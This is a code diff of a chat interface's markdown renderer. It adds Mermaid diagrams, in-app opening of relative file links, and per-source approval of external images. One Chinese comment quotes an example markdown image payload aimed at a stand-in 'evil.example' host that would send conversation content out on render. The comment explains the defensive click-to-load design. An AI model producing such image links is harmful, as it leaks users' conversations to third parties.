@@ -24,17 +24,33 @@ import remarkGfm from "remark-gfm";
 import { ChatScrollContext } from "@/components/chat/chat-scroll";
 import { PreviewImage } from "@/components/PreviewImage";
 import { useMarkdownActions } from "@/components/chat/markdown-actions";
-import { looksLikeFilePath } from "@/lib/chat/file-path";
+import { looksLikeFilePath, relativeMarkdownPath } from "@/lib/chat/file-path";
 import { IconCheckOutline14, IconCopyOutline16 } from "@/components/icons";
 import { copyText } from "@/lib/clipboard";
 import { useI18n } from "@/i18n";
+import { MermaidDiagram } from "@/components/MermaidDiagram";
 
-type MarkdownTextNode = { value?: unknown; children?: MarkdownTextNode[] };
+type MarkdownTextNode = { value?: unknown; tagName?: string; properties?: { className?: unknown }; children?: MarkdownTextNode[]; position?: { start: { offset?: number }; end: { offset?: number } } };
 
 function markdownNodeText(node: MarkdownTextNode | undefined): string {
 	if (!node) return "";
 	if (typeof node.value === "string") return node.value;
 	return node.children?.map(markdownNodeText).join("") ?? "";
+}
+
+function mermaidSource(node: MarkdownTextNode | undefined, markdown: string): string | null {
+	const code = node?.children?.find((child) => child.tagName === "code");
+	const classes = code?.properties?.className;
+	if (!Array.isArray(classes) || !classes.some((name) => String(name).toLowerCase() === "language-mermaid")) return null;
+	const start = node?.position?.start.offset;
+	const end = node?.position?.end.offset;
+	if (start === undefined || end === undefined) return null;
+	const fenced = markdown.slice(start, end).split(/\r?\n/);
+	const opening = /^[ \t>]*(`{3,}|~{3,})\s*mermaid(?:\s.*)?$/i.exec(fenced[0] ?? "");
+	if (!opening || fenced.length < 2) return null;
+	const marker = opening[1];
+	if (!new RegExp(`^[ \\t>]*${marker[0]}{${marker.length},}[ \\t]*$`).test(fenced.at(-1) ?? "")) return null;
+	return markdownNodeText(code).replace(/\n$/, "");
 }
 
 function CopyButton({ text }: { text: string }) {
@@ -79,11 +95,12 @@ function isInlineImage(src: string): boolean {
  * `![](https://evil.example/?d=<会话内容>)`，浏览器一渲染就把内容发出去了 —— 不需要用户点任何东西。
  */
 function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: string }) {
-	const [allowed, setAllowed] = useState(false);
+	const [allowedSource, setAllowedSource] = useState<string | null>(null);
+	const actions = useMarkdownActions();
 	const { t } = useI18n();
-	const source = typeof src === "string" ? src : "";
+	const source = typeof src === "string" ? actions.resolveImage?.(src) ?? src : "";
 	if (!source) return null;
-	if (allowed || isInlineImage(source)) return <PreviewImage image={source} alt={alt ?? ""} title={title} />;
+	if (allowedSource === source || isInlineImage(source)) return <PreviewImage image={source} alt={alt ?? ""} title={title} />;
 	let host = source;
 	try {
 		host = new URL(source).host || source;
@@ -91,7 +108,7 @@ function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: s
 		/* 保留原样 */
 	}
 	return (
-		<button type="button" className="btn-outline" style={{ height: 26, padding: "0 10px", fontSize: 12 }} title={source} onClick={() => setAllowed(true)}>
+		<button type="button" className="btn-outline" style={{ height: 26, padding: "0 10px", fontSize: 12 }} title={source} onClick={() => setAllowedSource(source)}>
 			{t.externalImage}{alt ? `：${alt}` : ""}（{host}）
 		</button>
 	);
@@ -107,6 +124,14 @@ function SafeImage({ src, alt, title }: { src?: unknown; alt?: string; title?: s
  * 站内链接（同源）不加标记，避免到处都是符号。
  */
 function MarkdownLink({ href, children, ...props }: { href?: string; children?: React.ReactNode } & Record<string, unknown>) {
+	const actions = useMarkdownActions();
+	const filePath = href ? relativeMarkdownPath(href) : null;
+	if (filePath !== null && actions.openFile) {
+		return <a href={href} {...props} onClick={(event) => {
+			event.preventDefault();
+			actions.openFile!(filePath);
+		}}>{children}</a>;
+	}
 	let external = false;
 	if (typeof href === "string" && href) {
 		if (/^https?:\/\//i.test(href)) {
@@ -136,12 +161,14 @@ const MarkdownContent = memo(function MarkdownContent({ text }: { text: string }
 			components={{
 				a: ({ node: _node, ...props }) => <MarkdownLink {...props} />,
 				img: ({ src, alt, title }) => <SafeImage src={src} alt={alt} title={title} />,
-				pre: ({ node, children, ...props }) => (
-					<div className="md-code-block">
+				pre: ({ node, children, ...props }) => {
+					const diagram = mermaidSource(node, text);
+					if (diagram !== null) return <MermaidDiagram source={diagram} />;
+					return <div className="md-code-block">
 						<div className="md-code-copy"><CopyButton text={markdownNodeText(node)} /></div>
 						<pre {...props}>{children}</pre>
-					</div>
-				),
+					</div>;
+				},
 				// 行内代码里常是文件路径：能认出来且能打开时，变成可点（只变色，不加下划线）
 				code: ({ node: _node, className, children }) => {
 					const raw = typeof children === "string" ? children : Array.isArray(children) ? children.join("") : "";
